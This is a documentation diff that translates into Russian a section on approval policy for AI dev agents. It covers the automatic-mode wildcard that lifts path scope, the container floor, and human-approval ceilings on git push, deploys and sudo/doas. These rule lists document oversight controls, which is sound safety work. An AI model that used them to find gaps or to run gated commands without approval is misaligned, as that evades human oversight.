-saber, se a opinião veio de uma regra ESPECÍFICA (<code>actionType: "terminal"</code>) ou
-da curinga <code>actionType: "*"</code> — o "modo automático": autonomia para QUALQUER
-tipo de ação daquele agente, ligada com um clique em "Modo automático" no
-<code>ApprovalCard</code>. A resolução acontece ANTES de este diagrama começar, num
-repositório só: <code>DrizzleAgentAutonomyRepository.findMode</code> procura a regra
-específica e a curinga na mesma consulta, e devolve a específica quando as duas
-existem — gravar <code>terminal: deny</code> com <code>"*": auto_approve</code> ligado continua
-negando <code>terminal</code> para aquele agente, enquanto libera o resto.</p>
-<p>Por isso o diagrama não ganhou nó novo, e os tetos, logo abaixo, valem para o
-"modo automático" porque reagem a <code>current.policy === 'auto_approve'</code>, nunca à
-origem dele (<a href=/brabo/dev/ru/business-rules/autenticacao#rn-154 target=_blank rel="noopener noreferrer" class="">RN-154</a>).</p>
-<p><strong>Uma exceção, decidida pelo dono do produto: o modo automático libera o
-escopo de caminho</strong> (<a href=/brabo/dev/ru/business-rules/autenticacao#rn-603 target=_blank rel="noopener noreferrer" class="">RN-603</a>,
-<a href=/brabo/dev/ru/adr/0167-modo-automatico-libera-o-escopo-de-caminho target=_blank rel="noopener noreferrer" class="">ADR 0167</a>). O
-repositório devolve também DE ONDE a autonomia veio
-(<code>AgentAutonomyRepository.resolve</code>: <code>especifica</code> ou <code>curinga</code>), e <code>decide()</code> a
-recebe como <code>ctx.autonomyOrigin</code>. Quando a curinga resolve para
-<code>auto_approve</code>, dois pedidos de aprovação somem: o <a href=#path-scope class="">teto de escopo de
-caminho</a> e o <code>require_approval</code> que um comando composto sintetiza
-para um segmento sem regra nenhuma. Então um agente em modo automático roda
-qualquer comando de terminal, mesmo fora da pasta do projeto — medido no
-<code>exp001</code>, 47 de 51 pedidos depois de o modo automático ser ligado vinham só do
-escopo, porque o dev agent roda dentro do container (<code>/work</code>) e o escopo
-compara com a raiz do HOST. Todo o resto fica: <code>deny</code> vence, um <code>ask</code> escrito
-no arquivo pergunta, o teto de efeito externo/privilegiado (push, PR, deploy,
-<code>sudo</code>/<code>doas</code>) roda primeiro e ignora a origem, e merge em branch protegida,
-<code>instruction_patch</code>, paralelismo e <code>container_remove</code> nunca auto-aprovam. Uma
-regra ESPECÍFICA (<code>terminal: auto_approve</code> ou <code>terminal: require_approval</code>)
-não é modo automático e mantém o teto de escopo.</p>
-<p>Quando um <code>git_merge</code> que o humano aprovou EXECUTA e o provider informa a PR
-como <code>merged</code>, a tarefa de onde a PR veio passa a <code>done</code> — uma vez: um merge
-repetido da mesma PR não a move de novo nem grava um segundo evento
-<code>backlog.task_status_changed</code> (<a href=/brabo/dev/ru/business-rules#rn-628 target=_blank rel="noopener noreferrer" class="">RN-628</a>). O merge
-em si nunca é automatizado (<a href=/brabo/dev/ru/business-rules#rn-418 target=_blank rel="noopener noreferrer" class="">RN-418</a>).</p>
-<p>Um <code>git_merge</code> é RECUSADO antes de ser criado quando a mesma PR já foi mergeada
-por uma execução anterior (409 <code>pr_ja_mergeado</code>) ou já tem uma proposta viva —
-pendente, aprovada ou auto-aprovada (409 <code>merge_ja_proposto</code>); uma negada ou
-falhada não impede tentar de novo. Aprovar um merge pendente cuja PR outra
-proposta já mergeou também é 409 <code>pr_ja_mergeado</code>, e a ação fica <code>pending</code>. Um
-gate de QA/SecOps ainda pendente NÃO é recusa: a aba de PRs e o chat só
-AVISAM, nomeando o gate, e o botão fica habilitado
-(<a href=/brabo/dev/ru/business-rules#rn-663 target=_blank rel="noopener noreferrer" class="">RN-663</a>).</p>
-<p>O "modo automático" exige <code>maintainer</code> — o mesmo papel que já protegia
-<code>PUT .../agent-autonomy</code> antes de a curinga existir. Desligá-lo reusa o toggle
-manual/auto que o card do agente já tinha em Visão geral/Executores: com a
-curinga gravada, o toggle passa a editar ELA em vez do tipo representativo de
-sempre, e "manual" nele é a mesma curinga regravada como <code>require_approval</code>.</p>
-<h3 class="anchor anchorTargetStickyNavbar_PEh0" id=o-piso-do-container-rn-492rn-493-adr-0134>O piso do container (<a href=/brabo/dev/ru/business-rules#rn-492 target=_blank rel="noopener noreferrer" class="">RN-492</a>/<a href=/brabo/dev/ru/business-rules#rn-493 target=_blank rel="noopener noreferrer" class="">RN-493</a>, <a href=/brabo/dev/ru/adr/0134-dev-agents-executam-dentro-do-container target=_blank rel="noopener noreferrer" class="">ADR 0134</a>)<a href=#o-piso-do-container-rn-492rn-493-adr-0134 class=hash-link aria-label="Прямая ссылка на o-piso-do-container-rn-492rn-493-adr-0134" title="Прямая ссылка на o-piso-do-container-rn-492rn-493-adr-0134" translate=no>​</a></h3>
-<p>O nó <code>C0</code> do diagrama acima é novo: quando a ação é <code>terminal</code> E o projeto tem
-um container REGISTRADO como <code>running</code> em <code>project_containers</code>
-(<code>execution_mode: container</code> — conferido por <code>ProposeActionUseCase</code>, que já lê
-o mesmo ciclo de vida do container que o lado da execução lê), o valor BASE
-deixa de ser <code>require_approval</code> e começa como <code>auto_approve</code>.</p>
-<p>Isto é um piso, não um teto novo, e a distinção importa: toda etapa seguinte
-(<code>agent_autonomy</code>, <code>permissions.json</code>) já SUBSTITUI o valor base quando tem
-opinião explícita — é o mesmo mecanismo que já deixava uma regra <code>deny</code> ou um
-padrão <code>ask</code> sobrepor o <code>require_approval</code> padrão hoje. Partir de
-<code>auto_approve</code> em vez de <code>require_approval</code> não muda essa propriedade: um
-<code>deny</code> explícito ou um padrão <code>ask</code> que casa continua vencendo o piso
-exatamente como já vencia o padrão. E os quatro tetos abaixo (<code>S</code>, <code>Z</code>, <code>H</code> e
-a regra do comando composto) continuam valendo por cima, incondicionalmente,
-venha o <code>auto_approve</code> do piso ou de uma regra explícita — <code>git push</code> dentro de
-um container em execução continua <code>require_approval</code>, como sempre.</p>
-<p><strong>Por que isto é seguro: uma segunda fronteira, mais forte, não a ausência de
-uma.</strong> Fora de um container, o escopo de caminho LÉXICO abaixo
-(<code>comandoNoEscopo</code> contra <code>projectScopeRoot</code>, um caminho do HOST) é o que torna
-seguro auto-aprovar via <code>permissions.json allow</code>. Dentro do container real, o
-comando fisicamente não enxerga nada fora de <code>/work</code> — o mount namespace do
-Docker — e o broker revalida de forma independente que o <code>cwd</code> está dentro de
-<code>/work</code> antes de rodar qualquer coisa (<code>DiretorioForaDoEscopoError</code>). <strong>O
-escopo de caminho léxico continua rodando por cima do piso, sem mudança</strong>:
-<code>cwd</code>/<code>command</code> que chegam a <code>decide()</code> nunca são traduzidos para <code>/work</code> (essa
-tradução acontece depois, do lado do engine, logo antes de chamar o broker),
-então um comando que hoje seria marcado fora do escopo continua marcado fora do
-escopo com o piso ligado — é defesa em profundidade redundante, não
-substituição.</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418>A fronteira de efeito externo e comando privilegiado (RN-418)<a href=#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418 class=hash-link aria-label="Прямая ссылка на A fronteira de efeito externo e comando privilegiado (RN-418)" title="Прямая ссылка на A fronteira de efeito externo e comando privilegiado (RN-418)" translate=no>​</a></h2>
-<p><strong>Revisão do <a href=/brabo/dev/ru/adr/0065-container-por-projeto-a-fronteira-deixa-de-ser-politica target=_blank rel="noopener noreferrer" class="">ADR 0065</a>
-pelo <a href=/brabo/dev/ru/adr/0102-revisao-do-adr-0065-teto-absoluto-substitui-deny target=_blank rel="noopener noreferrer" class="">ADR 0102</a></strong>
-— uma decisão GLOBAL e explícita do dono do produto, confirmada depois de um
-aviso automático de segurança sobre a mudança (o histórico inteiro está no
-ADR). O que segue descreve o comportamento ATUAL; a versão anterior (<code>deny</code>
-incondicional, aplicado antes de qualquer etapa permissiva) foi substituída,
-não afrouxada — veja o porquê logo abaixo.</p>
-<p><code>git push</code>, <code>git remote add</code>/<code>set-url</code>, <code>git merge</code>, as CLIs dos providers
-(<code>gh pr create</code>, <code>gh pr merge</code>, <code>glab mr create</code>/<code>merge</code>, releases e
-workflow dispatch), comandos comuns de deploy (<code>kubectl apply</code>, <code>helm upgrade</code>, <code>terraform apply</code>, <code>docker push</code>, <code>npm publish</code>, ...) e agora
-também <code>sudo</code>/<code>doas</code> num comando de <code>terminal</code> são um <strong>TETO ABSOLUTO</strong> (e,
-desde a <a href=/brabo/dev/ru/business-rules#rn-689 target=_blank rel="noopener noreferrer" class="">RN-689</a>, também as ações TIPADAS
-<code>git_push</code> e <code>pr_open</code>, que até então a curinga <code>"*"</code>, uma regra específica ou
-o <code>permissions.json</code> promoviam a <code>auto_approve</code>) — no mesmo bloco final dos
-outros três tetos (veja <a href=#caps class="">"Tetos"</a> abaixo), aplicado depois de
-<code>agent_autonomy</code> e <code>permissions.json</code> já terem opinado: se o veredito até ali
-era <code>auto_approve</code>, ele vira <code>require_approval</code> incondicional. Nem a curinga
-<code>"*"</code> do "modo automático" nem uma entrada <code>allow</code> no <code>permissions.json</code>
-conseguem promovê-lo de volta.</p>
-<p><strong>Por que <code>require_approval</code> agora é seguro, quando antes exigia <code>deny</code>.</strong> O
-motivo histórico do <code>deny</code> era concreto: "sempre permitir" grava o padrão no
-<code>allow</code>, e um único clique bastaria para reabrir a porta para sempre. Essa
-brecha foi fechada NA FONTE, não contornada:
+<p><strong>Узел <code>Z</code> сменил позицию</strong> (<a class="" href=/brabo/dev/ru/business-rules#rn-418>RN-418</a>, пересматривает
+<a class="" href=/brabo/dev/ru/business-rules/autenticacao#rn-106>RN-106</a>): до появления локального
+runner он стоял сразу после IAM и возвращал <code>deny</code> — теперь это
+ПРЕДЕЛ, в том же финальном блоке, что и остальные три, применяемый после того,
+как <code>agent_autonomy</code> и <code>permissions.json</code> уже высказались. Почему — см. раздел
+<a href=#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418 class="">«Граница внешнего эффекта и привилегированной команды»</a>
+ниже.</p>
+<h3 class="anchor anchorTargetStickyNavbar_PEh0" id=автоматический-режим-подстановочный-знак-agent_autonomy-rn-153>«Автоматический режим»: подстановочный знак <code>agent_autonomy</code> (<a class="" href=/brabo/dev/ru/business-rules/autenticacao#rn-153>RN-153</a>)<a href=#автоматический-режим-подстановочный-знак-agent_autonomy-rn-153 class=hash-link aria-label="Прямая ссылка на автоматический-режим-подстановочный-знак-agent_autonomy-rn-153" title="Прямая ссылка на автоматический-режим-подстановочный-знак-agent_autonomy-rn-153" translate=no>​</a></h3>
+<p>Узел <code>у agent_autonomy есть мнение?</code> на диаграмме выше не знает, и ему не нужно
+знать, пришло ли мнение из КОНКРЕТНОГО правила (<code>actionType: "terminal"</code>) или из
+подстановочного знака <code>actionType: "*"</code> — «автоматического режима»: автономии
+для ЛЮБОГО типа действия этого агента, включаемой одним нажатием на
+«Автоматический режим» в <code>ApprovalCard</code>. Разрешение происходит ДО начала этой
+диаграммы, в одном репозитории: <code>DrizzleAgentAutonomyRepository.findMode</code> ищет
+конкретное правило и подстановочный знак одним запросом и возвращает
+конкретное, когда есть оба, — запись <code>terminal: deny</code> при включённом
+<code>"*": auto_approve</code> по-прежнему запрещает <code>terminal</code> для этого агента, разрешая
+остальное.</p>
+<p>Поэтому на диаграмме не появился новый узел, а пределы, сразу ниже, действуют для
+«автоматического режима», потому что реагируют на <code>current.policy === 'auto_approve'</code>,
+никогда на его происхождение (<a class="" href=/brabo/dev/ru/business-rules/autenticacao#rn-154>RN-154</a>).</p>
+<p><strong>Одно исключение, решённое владельцем продукта: автоматический режим снимает
+область путей</strong> (<a class="" href=/brabo/dev/ru/business-rules/autenticacao#rn-603>RN-603</a>,
+<a class="" href=/brabo/dev/ru/adr/0167-modo-automatico-libera-o-escopo-de-caminho>ADR 0167</a>).
+Репозиторий возвращает также, ОТКУДА пришла автономия
+(<code>AgentAutonomyRepository.resolve</code>: <code>especifica</code> или <code>curinga</code>), и <code>decide()</code>
+получает это как <code>ctx.autonomyOrigin</code>. Когда подстановочный знак разрешается в
+<code>auto_approve</code>, исчезают два запроса одобрения: <a href=#path-scope class="">предел области
+путей</a> и <code>require_approval</code>, который составная команда
+синтезирует для сегмента без единого правила. Поэтому агент в автоматическом
+режиме выполняет любую команду terminal, даже вне папки проекта, — измерено в
+<code>exp001</code>: 47 из 51 запроса после включения автоматического режима исходили
+только от области, потому что dev agent работает внутри контейнера (<code>/work</code>), а
+область сравнивается с корнем ХОСТА. Всё остальное остаётся: <code>deny</code> побеждает,
+<code>ask</code>, записанный в файле, спрашивает, предел внешнего эффекта/привилегий
+(push, PR, deploy, <code>sudo</code>/<code>doas</code>) срабатывает первым и игнорирует
+происхождение, а merge в защищённую ветку, <code>instruction_patch</code>, параллелизм и
+<code>container_remove</code> никогда не автоодобряются. КОНКРЕТНОЕ правило
+(<code>terminal: auto_approve</code> или <code>terminal: require_approval</code>) не является
+автоматическим режимом и сохраняет предел области.</p>
+<p>Когда одобренный человеком <code>git_merge</code> ВЫПОЛНЯЕТСЯ и провайдер сообщает PR как
+<code>merged</code>, задача, из которой пришёл PR, переходит в <code>done</code> — один раз:
+повторный merge того же PR не перемещает её снова и не записывает второе событие
+<code>backlog.task_status_changed</code> (<a class="" href=/brabo/dev/ru/business-rules#rn-628>RN-628</a>). Сам merge
+никогда не автоматизируется (<a class="" href=/brabo/dev/ru/business-rules#rn-418>RN-418</a>).</p>
+<p><code>git_merge</code> ОТКЛОНЯЕТСЯ до создания, когда тот же PR уже был слит предыдущим
+выполнением (409 <code>pr_ja_mergeado</code>) или у него уже есть живое предложение —
+ожидающее, одобренное или автоодобренное (409 <code>merge_ja_proposto</code>); отклонённое
+или неудавшееся не мешает попробовать снова. Одобрение ожидающего merge, PR
+которого уже слило другое предложение, тоже 409 <code>pr_ja_mergeado</code>, и действие
+остаётся <code>pending</code>. Ещё ожидающий гейт QA/SecOps НЕ является отказом: вкладка PR
+и чат только ПРЕДУПРЕЖДАЮТ, называя гейт, а кнопка остаётся доступной
+(<a class="" href=/brabo/dev/ru/business-rules#rn-663>RN-663</a>).</p>
+<p>«Автоматический режим» требует <code>maintainer</code> — ту же роль, что уже защищала
+<code>PUT .../agent-autonomy</code> до появления подстановочного знака. Выключение
+переиспользует переключатель manual/auto, который уже был у карточки агента в
+Обзоре/Исполнителях: при записанном подстановочном знаке переключатель
+редактирует ЕГО вместо обычного представительного типа, а «manual» в нём — это
+тот же подстановочный знак, перезаписанный как <code>require_approval</code>.</p>
+<h3 class="anchor anchorTargetStickyNavbar_PEh0" id=нижняя-граница-контейнера-rn-492rn-493-adr-0134>Нижняя граница контейнера (<a class="" href=/brabo/dev/ru/business-rules#rn-492>RN-492</a>/<a class="" href=/brabo/dev/ru/business-rules#rn-493>RN-493</a>, <a class="" href=/brabo/dev/ru/adr/0134-dev-agents-executam-dentro-do-container>ADR 0134</a>)<a href=#нижняя-граница-контейнера-rn-492rn-493-adr-0134 class=hash-link aria-label="Прямая ссылка на нижняя-граница-контейнера-rn-492rn-493-adr-0134" title="Прямая ссылка на нижняя-граница-контейнера-rn-492rn-493-adr-0134" translate=no>​</a></h3>
+<p>Узел <code>C0</code> на диаграмме выше новый: когда действие — <code>terminal</code> И у проекта есть
+контейнер, ЗАРЕГИСТРИРОВАННЫЙ как <code>running</code> в <code>project_containers</code>
+(<code>execution_mode: container</code> — проверяется <code>ProposeActionUseCase</code>, который уже
+читает тот же жизненный цикл контейнера, что и сторона выполнения), БАЗОВОЕ
+значение перестаёт быть <code>require_approval</code> и начинается как <code>auto_approve</code>.</p>
+<p>Это нижняя граница, а не новый предел, и различие важно: каждый следующий этап
+(<code>agent_autonomy</code>, <code>permissions.json</code>) уже ЗАМЕНЯЕТ базовое значение, когда у
+него есть явное мнение, — тот же механизм, который уже позволял правилу <code>deny</code>
+или шаблону <code>ask</code> перекрыть стандартный <code>require_approval</code>. Старт с
+<code>auto_approve</code> вместо <code>require_approval</code> не меняет этого свойства: явный
+<code>deny</code> или совпавший шаблон <code>ask</code> по-прежнему побеждает нижнюю границу ровно так
+же, как побеждал стандарт. А четыре предела ниже (<code>S</code>, <code>Z</code>, <code>H</code> и правило
+составной команды) продолжают действовать поверх, безусловно, откуда бы ни
+пришёл <code>auto_approve</code> — из нижней границы или из явного правила, — <code>git push</code>
+внутри работающего контейнера по-прежнему <code>require_approval</code>, как всегда.</p>
+<p><strong>Почему это безопасно: вторая, более сильная граница, а не отсутствие
+границы.</strong> Вне контейнера ЛЕКСИЧЕСКАЯ область путей ниже
+(<code>comandoNoEscopo</code> против <code>projectScopeRoot</code>, путь ХОСТА) — это то, что делает
+безопасным автоодобрение через <code>permissions.json allow</code>. Внутри настоящего
+контейнера команда физически не видит ничего вне <code>/work</code> — mount namespace
+Docker, — а broker независимо перепроверяет, что <code>cwd</code> находится внутри
+<code>/work</code>, прежде чем что-либо запустить (<code>DiretorioForaDoEscopoError</code>).
+<strong>Лексическая область путей продолжает работать поверх нижней границы, без
+изменений</strong>: <code>cwd</code>/<code>command</code>, приходящие в <code>decide()</code>, никогда не переводятся в
+<code>/work</code> (этот перевод происходит позже, на стороне engine, прямо перед вызовом
+broker), поэтому команда, которая сегодня была бы помечена вне области,
+по-прежнему помечается вне области при включённой нижней границе, — это
+избыточная эшелонированная защита, а не замена.</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418>Граница внешнего эффекта и привилегированной команды (RN-418)<a href=#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418 class=hash-link aria-label="Прямая ссылка на Граница внешнего эффекта и привилегированной команды (RN-418)" title="Прямая ссылка на Граница внешнего эффекта и привилегированной команды (RN-418)" translate=no>​</a></h2>
+<p><strong>Пересмотр <a class="" href=/brabo/dev/ru/adr/0065-container-por-projeto-a-fronteira-deixa-de-ser-politica>ADR 0065</a>
+в <a class="" href=/brabo/dev/ru/adr/0102-revisao-do-adr-0065-teto-absoluto-substitui-deny>ADR 0102</a></strong>
+— ГЛОБАЛЬНОЕ и явное решение владельца продукта, подтверждённое после
+автоматического предупреждения безопасности об изменении (вся история — в
+ADR). Ниже описано ТЕКУЩЕЕ поведение; прежняя версия (безусловный <code>deny</code>,
+применяемый до любого разрешающего этапа) была заменена, а не ослаблена, —
+почему, см. сразу ниже.</p>
+<p><code>git push</code>, <code>git remote add</code>/<code>set-url</code>, <code>git merge</code>, CLI провайдеров
+(<code>gh pr create</code>, <code>gh pr merge</code>, <code>glab mr create</code>/<code>merge</code>, релизы и
+workflow dispatch), распространённые команды deploy (<code>kubectl apply</code>, <code>helm upgrade</code>, <code>terraform apply</code>, <code>docker push</code>, <code>npm publish</code>, ...) и теперь
+также <code>sudo</code>/<code>doas</code> в команде <code>terminal</code> являются <strong>АБСОЛЮТНЫМ ПРЕДЕЛОМ</strong> (а
+начиная с <a class="" href=/brabo/dev/ru/business-rules#rn-689>RN-689</a> — и ТИПИЗИРОВАННЫЕ действия
+<code>git_push</code> и <code>pr_open</code>, которые до того подстановочный знак <code>"*"</code>, конкретное
+правило или <code>permissions.json</code> повышали до <code>auto_approve</code>) — в том же
+финальном блоке, что и остальные три предела (см. <a href=#caps class="">«Пределы»</a> ниже),
+применяемом после того, как <code>agent_autonomy</code> и <code>permissions.json</code> уже
+высказались: если вердикт до этого был <code>auto_approve</code>, он становится
+безусловным <code>require_approval</code>. Ни подстановочный знак <code>"*"</code> «автоматического
+режима», ни запись <code>allow</code> в <code>permissions.json</code> не могут повысить его обратно.</p>
+<p><strong>Почему <code>require_approval</code> теперь безопасен, когда раньше требовался <code>deny</code>.</strong>
+Историческая причина <code>deny</code> была конкретной: «всегда разрешать» записывает
+шаблон в <code>allow</code>, и одного нажатия хватило бы, чтобы открыть дверь навсегда.
+Эта брешь закрыта В ИСТОЧНИКЕ, а не обойдена:
 <code>ApproveAlwaysActionUseCase</code>/<code>patternsForAction</code>
 (<code>apps/api/src/application/use-cases/actions/approve-always-action.use-case.ts</code>)
-RECUSAM gravar padrão no <code>allow</code> para ação de terminal com efeito externo de
-git ou comando privilegiado — o usuário continua aprovando a instância
-específica pelo fluxo normal, mas "sempre permitir" nunca grava o padrão nesses
-dois casos. Sem essa recusa, o teto seria decorativo.</p>
-<p><code>sudo</code>/<code>doas</code> ganharam categoria própria em <code>external-effect.ts</code>
-(<code>comandoPrivilegiadoNoComando</code>), casando pelo VERBO em qualquer segmento —
-mesmo princípio de <code>efeitoExternoNoComando</code> para git, que continua casando por
-<strong>prefixo de token</strong>, ignorando flags globais no meio (<code>git -C /tmp push</code> casa
-com <code>git push</code>). Cada segmento de um comando composto é conferido: <code>pnpm test && git push origin main</code> é barrado pelo segundo segmento, do mesmo jeito
-que um comando composto já exige que todo segmento case para virar
-<code>auto_approve</code>.</p>
-<p>O teto não tira poder do agente: para git, a mensagem de erro continua
-apontando qual ação <strong>tipada</strong> usar — <code>git_push</code>, <code>git_merge</code> ou <code>pr_open</code> —,
-que nasce <code>proposed_action</code>, segue o pipeline normal e grava no event log o que
-foi enviado e para onde (é o caminho que o dev agent já usa hoje,
-<code>agent_io.ex</code>). <code>sudo</code>/<code>doas</code> não têm ação tipada equivalente — a mensagem só
-explica por que aquele comando exige decisão humana.</p>
-<p><strong>Onde isto mais importa agora</strong>: o
-<a href=/brabo/dev/ru/adr/0103-runner-local-execucao-na-maquina-do-usuario target=_blank rel="noopener noreferrer" class="">runner local</a>
-executa comandos JÁ aprovados na própria máquina do usuário, com os
-privilégios dele — é exatamente o cenário em que um <code>sudo</code> legítimo (ou uma
-tentativa de escapar via <code>sudo</code>) precisa de uma parada humana garantida por
-construção, não por convenção do <code>permissions.json</code>.</p>
-<p><strong><code>container_remove</code> (ADR 0136, <a href=/brabo/dev/ru/business-rules#rn-495 target=_blank rel="noopener noreferrer" class="">RN-495</a>)
-entra na mesma recusa de "sempre permitir"</strong>, por um mecanismo mais simples
-que o de cima: ele não é comando de <code>terminal</code> casado por token, é um
-<code>actionType</code> próprio, então <code>ApproveAlwaysActionUseCase</code> recusa o clique de
-saída para esse tipo — nenhum padrão é gravado, e o usuário aprova a instância
-específica pelo fluxo normal. <code>container_start</code> e <code>container_stop</code> NÃO são
-recusados assim: podem ser configurados <code>auto_approve</code>, mesmo calibre de
-<code>open_adr_pr</code>/<code>open_infra_pr</code> — <code>container_stop</code> nunca é semeado, e
-<code>container_start</code> é semeado para o agente de Infra no aceite do handoff dele
-desde o ADR 0190.</p>
-<p><strong>Ordem de um clique em "sempre permitir" (<a href=/brabo/dev/ru/business-rules#rn-642 target=_blank rel="noopener noreferrer" class="">RN-642</a>).</strong>
-A aprovação e o padrão são gravados na MESMA transação: o padrão (no <code>allow</code>,
-ou no <code>agent_autonomy</code> para um dev agent de módulo) e o evento
-<code>permission.granted</code> dele só são escritos depois de a transição para fora de
-<code>pending</code> ser válida, e um padrão que falha ao gravar desfaz a aprovação. O
-<code>permissions.json</code> é arquivo e não entra na transação — a janela residual é o
-commit falhar depois de o arquivo ter sido escrito, declarada. Clicar numa ação
-que já saiu de <code>pending</code> por uma APROVAÇÃO (um duplo clique, a mesma ação
-pendente mostrada em dois painéis) é sucesso idempotente,
-<code>desfecho: "ja_aprovada"</code>, que grava o padrão só se ele falta; clicar numa ação
-NEGADA continua <code>409</code> com <code>reason: "acao_ja_recusada"</code> e não grava nada. Os
-tetos acima são conferidos antes de tudo isso, mesmo para uma ação que já foi
-aprovada.</p>
-<p><strong>A metade TIPADA do teto (AT-320).</strong> Até 30/09 só o comando digitado
-<code>git push</code> era recusado; uma ação tipada <code>git_push</code> passava e gravava
-<code>GitPush()</code> no <code>allow</code>. "Sempre permitir" agora recusa, por tipo, a lista
-única <code>TIPOS_SEM_SEMPRE_PERMITIR</code>
+ОТКАЗЫВАЮТСЯ записывать шаблон в <code>allow</code> для действия terminal с внешним
+эффектом git или привилегированной командой — пользователь по-прежнему
+одобряет конкретный экземпляр обычным путём, но «всегда разрешать» никогда не
+записывает шаблон в этих двух случаях. Без этого отказа предел был бы
+декоративным.</p>
+<p><code>sudo</code>/<code>doas</code> получили собственную категорию в <code>external-effect.ts</code>
+(<code>comandoPrivilegiadoNoComando</code>), совпадая по ГЛАГОЛУ в любом сегменте — тот же
+принцип, что и у <code>efeitoExternoNoComando</code> для git, который по-прежнему
+совпадает по <strong>префиксу токенов</strong>, игнорируя глобальные флаги посередине
+(<code>git -C /tmp push</code> совпадает с <code>git push</code>). Проверяется каждый сегмент
+составной команды: <code>pnpm test && git push origin main</code> блокируется вторым
+сегментом, так же как составная команда уже требует совпадения каждого
+сегмента, чтобы стать <code>auto_approve</code>.</p>
+<p>Предел не отнимает у агента возможностей: для git сообщение об ошибке
+по-прежнему указывает, какое <strong>типизированное</strong> действие использовать —
+<code>git_push</code>, <code>git_merge</code> или <code>pr_open</code>, — которое рождается как
+<code>proposed_action</code>, проходит обычный конвейер и записывает в event log, что и
+куда было отправлено (это путь, которым dev agent уже пользуется сегодня,
+<code>agent_io.ex</code>). У <code>sudo</code>/<code>doas</code> нет эквивалентного типизированного действия —
+сообщение лишь объясняет, почему эта команда требует решения человека.</p>
+<p><strong>Где это важнее всего теперь</strong>:
+<a class="" href=/brabo/dev/ru/adr/0103-runner-local-execucao-na-maquina-do-usuario>локальный runner</a>
+выполняет УЖЕ одобренные команды на машине самого пользователя, с его
+привилегиями, — ровно тот сценарий, в котором легитимный <code>sudo</code> (или попытка
+выйти через <code>sudo</code>) нуждается в остановке человеком, гарантированной
+конструкцией, а не соглашением <code>permissions.json</code>.</p>
+<p><strong><code>container_remove</code> (ADR 0136, <a class="" href=/brabo/dev/ru/business-rules#rn-495>RN-495</a>)
+попадает в тот же отказ «всегда разрешать»</strong>, через механизм проще описанного
+выше: это не команда <code>terminal</code>, сопоставляемая по токенам, а собственный
+<code>actionType</code>, поэтому <code>ApproveAlwaysActionUseCase</code> отклоняет нажатие для этого
+типа — никакой шаблон не записывается, и пользователь одобряет конкретный
+экземпляр обычным путём. <code>container_start</code> и <code>container_stop</code> так НЕ
+отклоняются: их можно настроить как <code>auto_approve</code>, тот же калибр, что у
+<code>open_adr_pr</code>/<code>open_infra_pr</code>, — <code>container_stop</code> никогда не засевается, а
+<code>container_start</code> засевается для агента Infra при принятии его handoff
+начиная с ADR 0190.</p>
+<p><strong>Порядок нажатия «всегда разрешать» (<a class="" href=/brabo/dev/ru/business-rules#rn-642>RN-642</a>).</strong>
+Одобрение и шаблон записываются в ОДНОЙ транзакции: шаблон (в <code>allow</code> или в
+<code>agent_autonomy</code> для dev agent модуля) и его событие <code>permission.granted</code>
+записываются только после того, как переход из <code>pending</code> признан допустимым, а
+шаблон, который не удалось записать, отменяет одобрение. <code>permissions.json</code> —
+файл и в транзакцию не входит — остаточное окно в том, что commit упадёт после
+записи файла, объявлено. Нажатие на действие, которое уже вышло из <code>pending</code>
+через ОДОБРЕНИЕ (двойной клик, то же ожидающее действие, показанное в двух
+панелях), — идемпотентный успех, <code>desfecho: "ja_aprovada"</code>, который записывает
+шаблон, только если его не хватает; нажатие на ОТКЛОНЁННОЕ действие
+по-прежнему <code>409</code> с <code>reason: "acao_ja_recusada"</code> и ничего не записывает.
+Пределы выше проверяются раньше всего этого, даже для уже одобренного действия.</p>
+<p><strong>ТИПИЗИРОВАННАЯ половина предела (AT-320).</strong> До 30/09 отклонялся только
+набранный <code>git push</code>; типизированное действие <code>git_push</code> проходило и
+записывало <code>GitPush()</code> в <code>allow</code>. «Всегда разрешать» теперь отклоняет, по
+типу, единый список <code>TIPOS_SEM_SEMPRE_PERMITIR</code>
 (<code>apps/api/src/domain/actions/sempre-permitir.ts</code>): <code>git_push</code>, <code>pr_open</code>,
-<code>git_merge</code>, <code>container_remove</code>, <code>instruction_patch</code>, <code>parallelize</code> e
-<code>raise_max_parallel</code> — <code>400</code> com <code>reason: "teto_do_sempre_permitir"</code>. O card
-de aprovação esconde o botão para a mesma lista (uma cópia conferida contra
-esta por teste). Quando entrou, isto NÃO mudou <code>decide()</code> nem o que a ativação
-da execução semeia; desde a <a href=/brabo/dev/ru/business-rules#rn-689 target=_blank rel="noopener noreferrer" class="">RN-689</a> os dois
-mudaram: <code>git_push</code> e <code>pr_open</code> estão dentro do teto da RN-418 em <code>decide()</code>
-(veja <a href=#caps class="">"Tetos"</a>), e ativar a execução semeia só <code>git_commit</code> como
-<code>auto_approve</code> para cada <code>dev-&lt;modulo></code>.</p>
-<p><strong>A unidade do padrão gravado: verbo + subcomando, um por segmento
-(<a href=/brabo/dev/ru/business-rules#rn-675 target=_blank rel="noopener noreferrer" class="">RN-675</a>, decisão do dono de 01/10).</strong> "Sempre
-permitir" não grava mais o comando inteiro byte a byte: cada segmento do
-comando (dividido em <code>&&</code>, <code>||</code>, <code>;</code>, <code>|</code>, <code>&</code>, como <code>decide()</code> o divide) vira
-um padrão — o verbo mais o subcomando quando o segundo token é uma palavra
-(<code>npm test</code>, <code>git status</code>, <code>mix test</code>, <code>npx vitest</code>), o verbo sozinho quando é
-um argumento que não é palavra (<code>cat src/x.ts</code> → <code>Terminal(cat)</code>,
-<code>cd ../lib</code> → <code>Terminal(cd)</code>), e o segmento EXATO quando o segundo token é uma
-flag (<code>ls -la src</code>) ou quando a unidade seria prefixo de um teto da RN-418
-(<code>git remote -v</code>, <code>gh pr list</code> ficam exatos). Um segmento que é prefixo de teto
-mesmo exato (<code>git</code> sozinho) não grava nada. <code>cd src/app && npm test</code> grava
-<code>Terminal(cd)</code> e <code>Terminal(npm test)</code>, e o próximo
-<code>cd lib/core && npm test -- --coverage</code> roda sem perguntar. O casamento
-continua por prefixo de token, os tetos continuam rodando depois do arquivo em
-<code>decide()</code>, e o escopo de caminho continua valendo fora do modo automático. O
-clique de um dev agent de módulo continua indo para o <code>agent_autonomy</code>, não
